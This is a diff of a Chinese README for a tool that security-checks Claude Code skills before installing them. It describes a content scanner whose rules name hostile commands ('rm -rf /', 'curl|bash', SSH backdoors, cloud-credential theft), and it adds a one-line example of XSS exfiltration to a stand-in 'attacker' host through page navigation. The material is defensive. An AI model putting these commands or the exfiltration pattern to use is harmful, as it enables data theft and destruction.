@@ -51,23 +51,12 @@ Skill Forge 在运维之上增加了五层安全验证：
 | **L4 冲突检测** | 文件覆盖、Hook 竞争、功能重叠、系统盘写入 | 简单规则 + Claude API（系统盘写入） |
 | **L5 沙箱审计** | 在加固过的 Docker 容器里加载 skill，收集它**计划**执行的 tool_call | Docker（gVisor 尚未接上） |
 
-## 快速安装
+## 安装
 
-```bash
-git clone https://github.com/<your-account>/skill-forge.git ~/.claude/skills/skill-forge
-```
+完整的安装步骤在 **[安装部署说明.md](安装部署说明.md)**：
 
-重启 Claude Code 即可生效。
-
-安装后的运行目录是 `~/.claude/skills/skill-forge/`，所有脚本都从该目录执行。
-
-> **要部署到另一台设备？** 见 [安装部署说明.md](安装部署说明.md) —— 前置依赖、代理配置的 15 处位置清单、部署自检命令、首次运行、开机自启、排错对照表。
-
-### 注册开机自启（可选）
-
-```powershell
-powershell -ExecutionPolicy Bypass -File ~/.claude/skills/skill-forge/daemon/install-service.ps1
-```
+前置依赖 → 放置位置 → 部署自检 → AI 密钥与 GitHub Token → 代理配置
+→ 首次运行 → 面板与浏览器扩展 → 开机自启 → 排错对照表。
 
 ## 使用方式
 
@@ -90,8 +79,7 @@ powershell -ExecutionPolicy Bypass -File ~/.claude/skills/skill-forge/daemon/ins
 |------|------|
 | `SKILL.md` | **给 Claude 读的说明书**。定义何时该做什么：装 skill 走哪几步、更新走哪几步、如何解析 `sources.json`。整套工具的入口，其余文件都是它调用的工具。 |
 | `README.md` | 给人看的项目介绍（本文件）。 |
-| `安装部署说明.md` | **新设备部署指南**：前置依赖、放置位置、代理配置的 14 处位置清单、部署自检命令、首次运行、开机自启、排错对照表，以及 L5「跳过 ≠ 通过」的部署注意事项。 |
-| `PROGRESS.md` | 开发进度快照：8 个任务完成 7 个，累计修复 22 个缺陷、97+ 测试通过。未完成项为 Task 8（实际使用中调优 SKILL.md）。 |
+| `安装部署说明.md` | **安装与部署的唯一入口**：前置依赖、获取与放置、部署自检、AI 密钥与 GitHub Token、代理配置（含"环境变量换不了代理"和 `no_proxy` 逃生口）、首次运行、面板与浏览器扩展、开机自启、排错对照表，以及 L5「跳过 ≠ 通过」的部署注意事项。 |
 | `sources.json` | **已安装 skill 的注册表**。每条记录来源 URL、分支、安装时的 git SHA、安装时间。更新时靠 `installed_sha` 与远程 HEAD 对比判断有无新提交。 |
 | `templates/install-queue.json` | **待安装队列**。面板点"安装"会由 bridge 直接处理（`POST /install` → `process_install_queue()` → `daemon/precheck.py` 跑 L1–L5 → 落盘）。队列文件既是触发点、也是断点续做的凭据。 |
 
@@ -103,7 +91,7 @@ powershell -ExecutionPolicy Bypass -File ~/.claude/skills/skill-forge/daemon/ins
 |------|------|
 | `l1_structure.py` | **查结构**：SKILL.md 是否存在、frontmatter 是否合法、必需字段是否齐全。 |
 | `l2_source.py` | **查来源**：GitHub 仓库是否可达、是否已归档、Star 数、最近维护迹象。走 GitHub API。 |
-| `l3_content_scan.py` | **查内容危险度**。扫描 SKILL.md 及所有附带脚本，三级分类：🔴 红色（`rm -rf /`、`curl\|bash`、`sudo` 等 13 条，直接拒绝）、🟡 黄色（网络请求、读取环境变量等 11 条，需人工复核）、🔵 蓝色（仅记录，不参与判定）。 |
+| `l3_content_scan.py` | **查内容危险度**。扫描 SKILL.md 及所有附带脚本，三级分类：🔴 红色（**7 条**，命中即 `REJECT` —— 毁灭性删除、写裸设备、fork 炸弹、格式化磁盘、注入 SSH 后门、窃取云凭证、监听端口后门）、🟡 黄色（**16 条**，命中即 `REVIEW`、**需人工复核** —— `sudo`/`doas` 提权、动态代码执行、`curl\|bash`、开放全部权限、读取 SSH 私钥、修改启动项、持久化注入等）、🔵 蓝色（仅记录，不参与判定）。<br>⚠️ **`curl\|bash`、`sudo`、`eval`、`chmod 777` 都在黄组，不在红组** —— 它们可疑，但也常见于正常脚本，一律拦会把大量正常 skill 挡在门外。红组收的是"一眼能看出是攻击工具"的那几条。 |
 | `l4_conflict_detect.py` | **查冲突**：是否覆盖已有 skill 的文件、两个 skill 是否争抢同一 Hook、功能描述相似度是否超 60%、是否向系统盘写入。系统盘写入会额外调用 Claude API 深度分析。 |
 | `l5_sandbox.py` | **沙箱试跑**。在加固过的 Docker 容器里（skill 只读挂载、非 root、能力全削、资源受限、跑完即毁）加载 skill，收集它**计划**执行的 tool_call 序列。⚠️ **这些调用不会被真的执行** —— 拿到的是「它想干什么」。<br>⚠️ Docker 不可用、或没拿到 AI 凭据时**标记 `SKIPPED`，不拦安装** —— 但**跳过不是通过**：报告汇总把"通过"和"跳过"分开数，一套永远跳过 L5 的部署等于没有 L5。凭据判定见 `verify/llm_auth.py`（**凭据管理器优先**，环境变量兜底）。<br>⚠️ 模型响应被截断时**不报 PASS** —— 「一轮都没成功」和「一轮都没看到调用」在报告里都是空列表，但含义相反。 |
 
@@ -178,6 +166,11 @@ powershell -ExecutionPolicy Bypass -File ~/.claude/skills/skill-forge/daemon/ins
 **真正决定"最坏能坏到哪"的是 bridge 侧**：R7 的鉴权、`daemon/safe_paths.py` 的路径校验、
 面板 CSP 的外发闸门。扩展只是那套守卫之外最外面的一圈。
 
+> ⚠️ **但"闸门"不等于"没有外发信道"**：CSP 的 `connect-src` 堵的是 fetch / XHR /
+> WebSocket / img 这类**取数**信道，它**管不住页面导航** —— `navigate-to` 这条指令
+> 从来没有落地。所以一次 XSS 仍然可以 `location.href = 'https://attacker/?' + 密钥`
+> 把东西带出去。它把外泄从"随手就能做"收窄成"得多绕一下"，但没有归零。
+
 | 文件 | 作用 |
 |------|------|
 | `templates/extension/manifest.json` | MV3 清单，**零权限**，无 `default_popup`（设了它点击图标就不触发）。 |
@@ -211,7 +204,6 @@ python -m daemon.build_extension      # 产物在 ~/.claude/skills/skill-forge/e
 | `tests/test_verify.py` | 验证引擎契约测试。 |
 | `tests/test_daemon.py` | 守护进程测试套件（最大的测试文件），覆盖 fetcher/classifier/notifier/watchdog。 |
 | `tests/test_panel_sim.py` | 以模拟数据渲染面板，验证 HTML 不会崩溃。 |
-| `tests/*-test-report.md` | 五份测试报告：运维脚本、守护进程、面板桥接、L5 沙箱、开机自启。 |
 
 ## 数据流
 
